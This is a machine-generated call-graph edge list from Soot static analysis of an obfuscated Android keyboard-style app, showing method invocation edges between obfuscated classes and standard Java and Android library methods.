SPECIAL edge: specialinvoke $r27.<mag: void <init>(java.lang.String,int,int)>("TENOR_FEATURED_METADATA", 27, 27) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ivv: java.lang.String c()>() in <ivv: ivw a()> ==> <ivv: java.lang.String c()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lup: void <init>(lwc,java.lang.String)> ==> <java.lang.Object: void <init>()>
STATIC edge: staticinvoke <ojg: void v(java.lang.String)>($r1) in <ojg: void d(java.lang.Object,java.lang.String)> ==> <ojg: void v(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <java.lang.Object: int hashCode()>
CLINIT edge: staticinvoke <mag: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <mag: void <clinit>()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.NullPointerException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r0) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lkg: void <init>(int)>(4) in <lkl: void <init>()> ==> <lkg: void <init>(int)>
VIRTUAL edge: $r4 = virtualinvoke $r2.<java.lang.Class: java.lang.reflect.Field getDeclaredField(java.lang.String)>($r3) in <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)> ==> <java.lang.Class: java.lang.reflect.Field getDeclaredField(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(1) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
INTERFACE edge: $i8 = interfaceinvoke $r14.<java.util.Comparator: int compare(java.lang.Object,java.lang.Object)>($r9, $r15) in <lvr: void <init>(lvr,lvr)> ==> <jlu: int compare(java.lang.Object,java.lang.Object)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("Uncategorized", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: staticinvoke <iej: void g(java.lang.String,iec)>("InputMethodEntryManager_ImeListLoaded", $r4) in <hnt: void <clinit>()> ==> <iej: void g(java.lang.String,iec)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lfc: void <init>(lfa)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.StringBuilder: int length()>() in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: int length()>
STATIC edge: $z0 = staticinvoke <lvr: boolean e(int,int)>($i0, $i4) in <lvr: void <init>(lvr,lvr)> ==> <lvr: boolean e(int,int)>
STATIC edge: $r5 = staticinvoke <java.util.Arrays: int[] copyOf(int[],int)>($r5, $i0) in <lvr: void <init>(lvr,lvr)> ==> <java.util.Arrays: int[] copyOf(int[],int)>
INTERFACE edge: $r7 = interfaceinvoke $r2.<ltn: lsq f()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsn: lsq f()>
SPECIAL edge: specialinvoke r0.<java.lang.Throwable: void <init>()>() in <java.lang.Exception: void <init>(java.lang.String,java.lang.Throwable)> ==> <java.lang.Throwable: void <init>()>
SPECIAL edge: specialinvoke $r5.<java.lang.StringBuilder: void <init>()>() in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: $r1 = staticinvoke <lri: java.util.ArrayList N()>() in <lri: java.util.ArrayList P(java.util.Iterator)> ==> <lri: java.util.ArrayList N()>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r4) in <lvs: lvs a(java.lang.Object)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <lvt: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Error: void <init>()>() in <java.lang.LinkageError: void <init>()> ==> <java.lang.Error: void <init>()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r1, $r2) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <jvu: void <init>(int)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r7 = virtualinvoke $r0.<hcb: hbv j(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object,java.lang.Object)>($r1, $r2, $r3, $r6) in <hbu: hbs f(java.lang.String,long)> ==> <hcb: hbv j(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(4) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
INTERFACE edge: interfaceinvoke $r1.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r4, $r6) in <iej: void g(java.lang.String,iec)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(float[],float[])>($r14, $r15) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(float[],float[])>
STATIC edge: $r17 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>($z0) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkq: int size()>() in <lkq: lsb C(int)> ==> <lqm: int size()>
VIRTUAL edge: $r5 = virtualinvoke $r7.<lsm: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
VIRTUAL edge: $c0 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i1) in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: char charAt(int)>
VIRTUAL edge: $r4 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("Autocomplete", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke $r0.<jvu: void <init>(int)>(1) in <jvu: void <clinit>()> ==> <jvu: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.String: int hashCode()>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.Set: boolean add(java.lang.Object)>($r1) in <ljf: boolean add(java.lang.Object)> ==> <java.util.HashSet: boolean add(java.lang.Object)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Long: java.lang.Long valueOf(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <ojg: void h(java.lang.Throwable)>($r2) in <ojg: void c(java.lang.Object,java.lang.String)> ==> <ojg: void h(java.lang.Throwable)>
SPECIAL edge: specialinvoke r0.<lkg: void c(java.lang.Object)>($r1) in <lkl: void h(java.lang.Object)> ==> <lkg: void c(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid country code: %s", $r0, $r6) in <ivw: ivw d(java.util.Locale)> ==> <lsv: void F(java.lang.String,java.lang.Object,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("].") in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r7 = staticinvoke <lvs: lvs a(java.lang.Object)>($r2) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <lvs: lvs a(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Exception: void <init>(java.lang.String,java.lang.Throwable)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean t(char[],int,int)>($r3, $i1, 4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean t(char[],int,int)>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>($r4, $i0, 0, $i0) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>
SPECIAL edge: specialinvoke $r11.<lvt: void <init>(lvr)>($r15) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lvt: void <init>(lvr)>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>($r2, $i2, 0, $i0) in <j$.util.concurrent.ConcurrentHashMap: int hashCode()> ==> <j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r0) in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $i2 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.lang.String: int hashCode()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(2) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("cause", class "Ljava/lang/Throwable;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Class: boolean isAssignableFrom(java.lang.Class)>($r4) in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.Class: boolean isAssignableFrom(java.lang.Class)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(10) in <lvr: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.String: int hashCode()>() in <lsp: int hashCode()> ==> <java.lang.String: int hashCode()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(2) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean s(java.lang.String)>($r1) in <ivv: void g(java.lang.String)> ==> <ivw: boolean s(java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
STATIC edge: $r3 = staticinvoke <java.lang.Long: java.lang.Long valueOf(long)>($l0) in <hbu: hbs f(java.lang.String,long)> ==> <java.lang.Long: java.lang.Long valueOf(long)>
STATIC edge: staticinvoke <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)>
SPECIAL edge: specialinvoke $r5.<hno: void <init>()>() in <hnt: void <clinit>()> ==> <hno: void <init>()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(13) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean u(char)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lsp: int hashCode()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r7.<java.lang.StringBuilder: java.lang.String toString()>() in <nzh: boolean f(ivv)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r1.<lsh: void <init>(lto)>($r2) in <lsh: lsh j(java.lang.String)> ==> <lsh: void <init>(lto)>
VIRTUAL edge: $r6 = virtualinvoke $r3.<java.lang.String: java.lang.String substring(int)>($i1) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String substring(int)>
SPECIAL edge: specialinvoke $r3.<java.util.NoSuchElementException: void <init>()>() in <lje: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lma: int hashCode()>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqr: lsa l()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Float: java.lang.Float valueOf(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke $r1.<java.lang.Object: java.lang.Class getClass()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.Object: java.lang.Class getClass()>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.util.Collection: java.lang.Object[] toArray()>() in <lma: lma p(java.util.Collection)> ==> <lkh: java.lang.Object[] toArray()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Set: java.util.Iterator iterator()>() in <ljf: java.util.Iterator iterator()> ==> <java.util.HashSet: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractMap: void <init>()>() in <lvr: void <init>(java.util.List)> ==> <java.util.AbstractMap: void <init>()>
SPECIAL edge: specialinvoke r1.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("Local", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r4.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("negative size: ") in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(93) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: int hashCode()>
STATIC edge: $i0 = staticinvoke <java.lang.System: int identityHashCode(java.lang.Object)>($r0) in <j$.util.concurrent.r: int i(java.lang.Object,java.lang.Object)> ==> <java.lang.System: int identityHashCode(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lqs: boolean isEmpty()>() in <lqs: boolean equals(java.lang.Object)> ==> <java.util.AbstractCollection: boolean isEmpty()>
VIRTUAL edge: $r0 = virtualinvoke $r4.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Double: boolean isNaN(double)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqr: lsa l()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <gwk: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<iec: void <init>()>() in <hno: void <init>()> ==> <iec: void <init>()>
STATIC edge: staticinvoke <iye: void Q(int,int)>($i0, $i1) in <lkq: lsb C(int)> ==> <iye: void Q(int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap: int hashCode()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
SPECIAL edge: specialinvoke $r4.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lri: boolean a(java.util.Comparator,java.lang.Iterable)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r6) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int j()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lkh: int j()>
VIRTUAL edge: $z0 = virtualinvoke r0.<lsb: boolean hasNext()>() in <lsb: java.lang.Object next()> ==> <lsb: boolean hasNext()>
STATIC edge: $r4 = staticinvoke <java.lang.Integer: java.lang.String toHexString(int)>($i2) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.Integer: java.lang.String toHexString(int)>
STATIC edge: $r3 = staticinvoke <j$.util.DesugarTimeZone: java.util.TimeZone getTimeZone(java.lang.String)>("GMT") in <ose: void <clinit>()> ==> <j$.util.DesugarTimeZone: java.util.TimeZone getTimeZone(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljf: boolean m()>() in <ljf: java.lang.Object[] toArray()> ==> <ljf: boolean m()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<lkm: void <init>(lkq,int)>(r0, $i0) in <lkq: lsb C(int)> ==> <lkm: void <init>(lkq,int)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lkg: void c(java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: java.lang.Class getClass()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<lvr: int hashCode()>() in <lvt: int hashCode()> ==> <lvr: int hashCode()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lmc: void <init>(lme)> ==> <lma: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lji: void <init>(java.util.Comparator)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $r5 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: void O(int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsn: void <init>(java.util.logging.Level)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $r7 = staticinvoke <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>("[0-9]+") in <iwt: void <clinit>()> ==> <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lsn: lsw d()>() in <lsn: lsw i(lsq)> ==> <lsf: lsw d()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: boolean equals(java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lqr: int size()>
SPECIAL edge: specialinvoke $r0.<lqs: void <init>(lkq,java.util.Comparator)>($r2, $r1) in <lqs: void <clinit>()> ==> <lqs: void <init>(lkq,java.util.Comparator)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(17) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $r2 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lqs: int size()>
SPECIAL edge: specialinvoke $r4.<java.lang.StringBuilder: void <init>()>() in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.CharSequence,int,int)>($r2, $i1, $i3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.CharSequence,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.w: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $r6 = staticinvoke <ivw: java.lang.String l(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <ivw: java.lang.String l(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lkf: void <init>()>() in <lqk: void <init>(java.lang.Object[],int)> ==> <lkf: void <init>()>
SPECIAL edge: specialinvoke $r2.<lki: void <init>(java.lang.Object,java.lang.Object)>($r0, $r1) in <lri: java.util.Map$Entry H(java.lang.Object,java.lang.Object)> ==> <lki: void <init>(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.String: int hashCode()>() in <lsp: int hashCode()> ==> <java.lang.String: int hashCode()>
STATIC edge: $r6 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r3, $i2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r14.<lvt: boolean a()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lvt: boolean a()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lqs: boolean containsAll(java.util.Collection)>($r4) in <lqs: boolean equals(java.lang.Object)> ==> <lqs: boolean containsAll(java.util.Collection)>
SPECIAL edge: specialinvoke $r5.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("extlang subtag only occurs when language subtag length is 2 or 3") in <ivv: ivw a()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.List: java.util.Iterator iterator()>() in <ivv: java.lang.String c()> ==> <java.util.ArrayList: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(11) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
STATIC edge: $r2 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
STATIC edge: $i0 = staticinvoke <java.lang.Integer: int rotateLeft(int,int)>($i0, 15) in <izw: int ac(int)> ==> <java.lang.Integer: int rotateLeft(int,int)>
VIRTUAL edge: $r4 = virtualinvoke $r3.<java.lang.Object: java.lang.String toString()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: java.lang.String toString()>
STATIC edge: staticinvoke <j$.util.concurrent.ThreadLocalRandom: void c()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: void c()>
